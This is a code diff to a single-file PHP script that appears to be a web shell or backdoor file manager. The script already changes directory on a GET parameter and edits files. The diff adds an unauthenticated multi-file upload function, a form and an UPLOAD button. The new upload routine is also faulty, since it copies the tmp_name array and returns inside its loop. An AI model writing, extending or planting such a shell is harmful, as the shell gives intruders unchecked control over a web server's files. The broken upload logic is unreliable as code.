@@ -156,7 +156,7 @@ class x {
         error_log($debug);
         set_time_limit($time);
         $this->root = $_SERVER['DOCUMENT_ROOT'];
-        $this->cwd 	= $this->cwd();
+        $this->cwd 	= $this->cwd() . DIRECTORY_SEPARATOR;
         $this->cft 	= time();
     }
     public function home() {
@@ -201,6 +201,12 @@ class x {
     			break;
     	}
     }
+    public function upload(array $file) {
+    	$this->files = count($file['tmp_name']);
+    	for ($i=0; $i < $this->files ; $i++) { 
+    		return copy($file['tmp_name'], $this->cwd . $file['name']);
+    	}
+    }
     public function size($filename) {
     	if (is_file($filename)) {
     		$this->filepath = $filename;
@@ -238,6 +244,37 @@ $x = new x();
 if (isset($_GET['cd'])) {
 	$x->cd($_GET['cd']);
 }
+
+switch (@$_POST['tools']) {
+	case 'upload':
+		if (isset($_POST['submit'])) {
+			if ($x->upload($_FILES['file'])) {
+				$x->vars("success");
+			} else {
+				$x->vars("failed");
+			}
+		}
+		?>
+		<form method="post" enctype="multipart/form-data">
+			<tr>
+				<td>
+					<input type="file" name="file[]" multiple>
+				</td>
+				<td>
+					<input type="submit" name="submit">
+					<input type="hidden" name="tools" value="upload">
+				</td>
+			</tr>
+		</form>
+		<?php
+		exit();
+		break;
+	
+	default:
+		# code...
+		break;
+}
+
 switch (@$_POST['act']) {
 	case 'edit':
 		if (isset($_POST['submit'])) {
@@ -321,9 +358,12 @@ foreach (scandir(getcwd()) as $key => $value) {
 						<img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icon">
 					</a>
 				</td>
-				<td colspan="4" class="header">
-					<a href="<?= $x->home() ?>">HOME</a>
-				</td>
+				<form method="post">
+					<td colspan="4" class="header">
+						<a href="<?= $x->home() ?>">HOME</a>
+						<button name="tools" value="upload">UPLOAD</button>
+					</td>
+				</form>
 			</tr>
 			<tr>
 				<td colspan="6"></td>
